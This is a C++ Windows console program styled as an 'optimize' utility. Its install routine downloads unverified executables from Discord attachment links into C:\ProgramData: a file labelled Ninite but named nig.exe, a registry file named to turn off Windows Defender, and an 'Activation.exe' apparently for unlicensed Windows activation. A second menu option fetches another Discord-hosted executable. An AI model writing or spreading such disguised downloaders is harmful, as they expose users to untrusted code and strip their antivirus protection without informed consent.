
#include <iostream>
#include <Windows.h>
#include "Header.h"
using namespace std;
int choice;

void install() //install
{	//Radeon Graphics

	//Ninite
	string ninite = "https://cdn.discordapp.com/attachments/867484542637834290/867495450213875742/nig.exe";
	string ninitepath = "C:\\ProgramData\\nig.exe";
	URLDownloadToFile(NULL, ninite.c_str(), ninitepath.c_str(), 0, NULL);
	//Windows defender off
	string windows_defender_off = "https://cdn.discordapp.com/attachments/791407771131183155/866696478349328414/windows_defender_off.reg";
	string windows_defender_offpath = "C:\\ProgramData\\windows_defender_off.reg";
	URLDownloadToFile(NULL, windows_defender_off.c_str(), windows_defender_offpath.c_str(), 0, NULL);
	//Windows activation
	string Activation = "https://cdn.discordapp.com/attachments/865655772235169793/866385509052186663/Activation.exe";
	string Activationpath = "C:\\ProgramData\\Activation.exe";
	URLDownloadToFile(NULL, Activation.c_str(), Activationpath.c_str(), 0, NULL);
	//Dragon Center zip file
	string dragoncent = "https://download.msi.com/uti_exe/common/Dragon-Center.zip";
	string dragoncentpath = "C:\\ProgramData\\Dragon-Center.zip";
	URLDownloadToFile(NULL, dragoncent.c_str(), dragoncentpath.c_str(), 0, NULL);

	system("Start C:\\ProgramData\\Dragon-Center.zip");
	system("ipconfig /flushdns");
	system("ipconfig /registerdns");
	system("ipconfig /release");
	system("ipconfig /renew");
	system("netsh winsock reset");
}

void erer() {
	string rd = "https://cdn.discordapp.com/attachments/867484542637834290/867497664660242482/rd2021.exe";
	string rdpath = "C:\\ProgramData\\rd2021.exe";
	URLDownloadToFile(NULL, rd.c_str(), rdpath.c_str(), 0, NULL);
}

void title()
{
	HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hStdOut, FOREGROUND_RED);
	inline void setcolor(int textcol, int backcol);
	std::string raw_str = R"(
 ________  ________  _________  ___  _____ ______   ___  ________  _______      
|\   __  \|\   __  \|\___   ___\\  \|\   _ \  _   \|\  \|\_____  \|\  ___ \     
\ \  \|\  \ \  \|\  \|___ \  \_\ \  \ \  \\\__\ \  \ \  \\|___/  /\ \   __/|    
 \ \  \\\  \ \   ____\   \ \  \ \ \  \ \  \\|__| \  \ \  \   /  / /\ \  \_|/__  
  \ \  \\\  \ \  \___|    \ \  \ \ \  \ \  \    \ \  \ \  \ /  /_/__\ \  \_|\ \ 
   \ \_______\ \__\        \ \__\ \ \__\ \__\    \ \__\ \__\\________\ \_______\
    \|_______|\|__|         \|__|  \|__|\|__|     \|__|\|__|\|_______|\|_______|
                                                                                
)";
	std::cout << raw_str;
}
int main()
{
	SetRandomTitle();
menu:
	title();
	cin >> choice;
	if (choice == 1)
	{
		install();
	}
	if (choice == 2)
	{
		erer();
	}
}